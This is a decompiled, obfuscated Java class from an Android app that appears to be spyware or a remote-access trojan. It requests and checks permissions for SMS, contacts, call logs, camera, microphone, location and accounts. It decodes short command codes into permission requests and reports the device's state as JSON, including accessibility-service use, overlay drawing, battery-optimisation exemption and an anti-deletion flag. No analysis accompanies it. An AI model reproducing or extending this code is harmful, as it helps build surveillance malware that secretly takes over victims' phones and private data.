/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.os.Build$VERSION
 *  android.os.Environment
 *  android.provider.Settings
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import java.util.ArrayList;
import linker.resourcer.encoder.ConfigManager;
import linker.resourcer.encoder.aaskrfyvhoypymnzlskbzwpyr;
import linker.resourcer.encoder.ffbrxjknfnpfxahr;
import linker.resourcer.encoder.jhvbzpdwpbqgticwdxuva;
import linker.resourcer.encoder.tqvrhaaccrutxfxdqsvweshxhwtl;
import org.json.JSONObject;

public class ilqmejlkxuvezjdhvljqrnu {
    public static String[] ALL_PERMISSIONS(Context context) {
        ArrayList<String> arrayList = new ArrayList<String>();
        Object object = ConfigManager.getInstance();
        if (((ConfigManager)object).req_files) {
            if (Build.VERSION.SDK_INT >= 33) {
                arrayList.add("android.permission.READ_MEDIA_IMAGES");
                arrayList.add("android.permission.READ_MEDIA_VIDEO");
                arrayList.add("android.permission.READ_MEDIA_AUDIO");
            } else if (Build.VERSION.SDK_INT <= 32) {
                arrayList.add("android.permission.WRITE_EXTERNAL_STORAGE");
                arrayList.add("android.permission.READ_EXTERNAL_STORAGE");
            }
        }
        if (((ConfigManager)object).req_Rcontct) {
            arrayList.add("android.permission.READ_CONTACTS");
            arrayList.add("android.permission.WRITE_CONTACTS");
        }
        if (((ConfigManager)object).req_callphone) {
            arrayList.add("android.permission.CALL_PHONE");
        }
        if (((ConfigManager)object).req_sms) {
            arrayList.add("android.permission.READ_SMS");
        }
        if (((ConfigManager)object).req_ssms) {
            arrayList.add("android.permission.SEND_SMS");
        }
        if (((ConfigManager)object).req_cam) {
            arrayList.add("android.permission.CAMERA");
        }
        arrayList.add("android.permission.READ_PHONE_STATE");
        if (Build.VERSION.SDK_INT >= 26) {
            arrayList.add("android.permission.READ_PHONE_NUMBERS");
        }
        if (((ConfigManager)object).req_mic) {
            arrayList.add("android.permission.RECORD_AUDIO");
        }
        arrayList.add("android.permission.ACCESS_WIFI_STATE");
        arrayList.add("android.permission.ACCESS_NETWORK_STATE");
        arrayList.add("android.permission.WAKE_LOCK");
        arrayList.add("android.permission.INTERNET");
        if (Build.VERSION.SDK_INT >= 33 && ((ConfigManager)object).req_notification) {
            arrayList.add("android.permission.POST_NOTIFICATIONS");
        }
        if (((ConfigManager)object).req_location) {
            arrayList.add("android.permission.ACCESS_FINE_LOCATION");
            arrayList.add("android.permission.ACCESS_COARSE_LOCATION");
        }
        object = arrayList.iterator();
        while (object.hasNext()) {
            if (ffbrxjknfnpfxahr.isPermissionDeclaredInManifest(context, (String)object.next())) continue;
            object.remove();
        }
        return arrayList.toArray(new String[0]);
    }

    public static String[] GetPrimname(Prims prims) {
        ArrayList<String> arrayList = new ArrayList<String>();
        switch (1.$SwitchMap$com$icontrol$protector$ilqmejlkxuvezjdhvljqrnu$Prims[prims.ordinal()]) {
            default: {
                break;
            }
            case 5: {
                arrayList.add("android.permission.READ_CONTACTS");
                break;
            }
            case 4: {
                arrayList.add("android.permission.READ_SMS");
                break;
            }
            case 3: {
                arrayList.add("android.permission.RECORD_AUDIO");
                break;
            }
            case 2: {
                arrayList.add("android.permission.CAMERA");
                break;
            }
            case 1: {
                if (Build.VERSION.SDK_INT >= 33) {
                    arrayList.add("android.permission.READ_MEDIA_IMAGES");
                    arrayList.add("android.permission.READ_MEDIA_VIDEO");
                    arrayList.add("android.permission.READ_MEDIA_AUDIO");
                    break;
                }
                arrayList.add("android.permission.WRITE_EXTERNAL_STORAGE");
                arrayList.add("android.permission.READ_EXTERNAL_STORAGE");
            }
        }
        return arrayList.toArray(new String[arrayList.size()]);
    }

    public static String[] GetRequierdPrims(String stringArray) {
        try {
            ArrayList<String> arrayList = new ArrayList<String>();
            if (stringArray.contains("FA")) {
                if (Build.VERSION.SDK_INT >= 33) {
                    arrayList.add("android.permission.READ_MEDIA_IMAGES");
                    arrayList.add("android.permission.READ_MEDIA_VIDEO");
                    arrayList.add("android.permission.READ_MEDIA_AUDIO");
                } else {
                    arrayList.add("android.permission.READ_EXTERNAL_STORAGE");
                    arrayList.add("android.permission.WRITE_EXTERNAL_STORAGE");
                }
            }
            if (stringArray.contains("CA")) {
                arrayList.add("android.permission.CAMERA");
            }
            if (stringArray.contains("MC")) {
                arrayList.add("android.permission.RECORD_AUDIO");
            }
            if (stringArray.contains("SS")) {
                arrayList.add("android.permission.SEND_SMS");
            }
            if (stringArray.contains("SW")) {
                arrayList.add("android.permission.SET_WALLPAPER");
            }
            if (stringArray.contains("RS")) {
                arrayList.add("android.permission.READ_SMS");
            }
            if (stringArray.contains("RCG")) {
                arrayList.add("android.permission.READ_CALL_LOG");
            }
            if (stringArray.contains("CRC")) {
                arrayList.add("android.permission.READ_CONTACTS");
            }
            if (stringArray.contains("GA")) {
                arrayList.add("android.permission.GET_ACCOUNTS");
            }
            if (stringArray.contains("LOC")) {
                arrayList.add("android.permission.ACCESS_FINE_LOCATION");
                arrayList.add("android.permission.ACCESS_COARSE_LOCATION");
            }
            if (stringArray.contains("NT")) {
                arrayList.add("android.permission.POST_NOTIFICATIONS");
            }
            if (stringArray.contains("CP")) {
                arrayList.add("android.permission.CALL_PHONE");
            }
            stringArray = arrayList.toArray(new String[arrayList.size()]);
            return stringArray;
        }
        catch (Exception exception) {
            return new String[]{"EX", exception.getMessage()};
        }
    }

    public static String Load(Context context) {
        boolean bl;
        JSONObject jSONObject;
        block16: {
            jSONObject = new JSONObject();
            jSONObject.put(aaskrfyvhoypymnzlskbzwpyr.Time_Stamp, (Object)ffbrxjknfnpfxahr.FullStamp());
            jSONObject.put(aaskrfyvhoypymnzlskbzwpyr.Accessibility_Service, tqvrhaaccrutxfxdqsvweshxhwtl.is_Access_Enabled(context, jhvbzpdwpbqgticwdxuva.class));
            String string2 = aaskrfyvhoypymnzlskbzwpyr.Read_Contacts;
            int n = context.checkSelfPermission("android.permission.READ_CONTACTS");
            boolean bl2 = true;
            bl = n == 0;
            jSONObject.put(string2, bl);
            string2 = aaskrfyvhoypymnzlskbzwpyr.Read_SMS;
            bl = context.checkSelfPermission("android.permission.READ_SMS") == 0;
            jSONObject.put(string2, bl);
            string2 = aaskrfyvhoypymnzlskbzwpyr.Read_Call_Log;
            bl = context.checkSelfPermission("android.permission.READ_CALL_LOG") == 0;
            jSONObject.put(string2, bl);
            string2 = aaskrfyvhoypymnzlskbzwpyr.Acc_Camera;
            bl = context.checkSelfPermission("android.permission.CAMERA") == 0;
            jSONObject.put(string2, bl);
            string2 = aaskrfyvhoypymnzlskbzwpyr.Get_Accounts;
            bl = context.checkSelfPermission("android.permission.GET_ACCOUNTS") == 0;
            jSONObject.put(string2, bl);
            string2 = aaskrfyvhoypymnzlskbzwpyr.Record_Audio;
            bl = context.checkSelfPermission("android.permission.RECORD_AUDIO") == 0;
            jSONObject.put(string2, bl);
            bl = context.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == 0 && context.checkSelfPermission("android.permission.ACCESS_COARSE_LOCATION") == 0;
            jSONObject.put("Location", bl);
            string2 = aaskrfyvhoypymnzlskbzwpyr.Call_Phone;
            bl = context.checkSelfPermission("android.permission.CALL_PHONE") == 0;
            jSONObject.put(string2, bl);
            jSONObject.put(aaskrfyvhoypymnzlskbzwpyr.Call_Record, false);
            string2 = aaskrfyvhoypymnzlskbzwpyr.Send_SMS;
            bl = context.checkSelfPermission("android.permission.SEND_SMS") == 0;
            jSONObject.put(string2, bl);
            string2 = aaskrfyvhoypymnzlskbzwpyr.Set_Wallpaper;
            bl = context.checkSelfPermission("android.permission.SET_WALLPAPER") == 0;
            jSONObject.put(string2, bl);
            jSONObject.put(aaskrfyvhoypymnzlskbzwpyr.Doze_Mode, ffbrxjknfnpfxahr.IsIgnore_Battery(context));
            string2 = aaskrfyvhoypymnzlskbzwpyr.Draw_Overlays;
            bl = Settings.canDrawOverlays((Context)context) ? bl2 : false;
            jSONObject.put(string2, bl);
            jSONObject.put(aaskrfyvhoypymnzlskbzwpyr.Package_Installs, false);
            jSONObject.put(aaskrfyvhoypymnzlskbzwpyr.write_settings_sys, false);
            bl = ilqmejlkxuvezjdhvljqrnu.hasFileAccess(context);
            jSONObject.put(aaskrfyvhoypymnzlskbzwpyr.file_acc_state, (Object)String.valueOf(bl));
            bl = bl2 = true;
            if (Build.VERSION.SDK_INT < 33) break block16;
            bl = bl2;
            if (context.checkSelfPermission("android.permission.POST_NOTIFICATIONS") == 0) break block16;
            bl = false;
        }
        try {
            jSONObject.put(aaskrfyvhoypymnzlskbzwpyr.Post_Noty, bl);
            jSONObject.put(aaskrfyvhoypymnzlskbzwpyr.Ant_delet, jhvbzpdwpbqgticwdxuva.PreventDelete);
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        return jSONObject.toString();
    }

    public static boolean hasFileAccess(Context context) {
        int n = Build.VERSION.SDK_INT;
        boolean bl = true;
        boolean bl2 = true;
        if (n >= 30 && Environment.isExternalStorageManager()) {
            return true;
        }
        if (Build.VERSION.SDK_INT >= 33) {
            bl = context.checkSelfPermission("android.permission.READ_MEDIA_IMAGES") != 0 && context.checkSelfPermission("android.permission.READ_MEDIA_VIDEO") != 0 && context.checkSelfPermission("android.permission.READ_MEDIA_AUDIO") != 0 ? false : bl2;
            return bl;
        }
        if (context.checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE") != 0) {
            bl = false;
        }
        return bl;
    }

    public static boolean hasPermissions(Context context, String ... stringArray) {
        if (context != null && stringArray != null) {
            int n = stringArray.length;
            for (int i = 0; i < n; ++i) {
                if (ActivityCompat.checkSelfPermission(context, stringArray[i]) == 0) continue;
                return false;
            }
        }
        return true;
    }

    public static enum Prims {
        Files,
        Camera,
        Microphone,
        SMS,
        Contacts;

    }
}

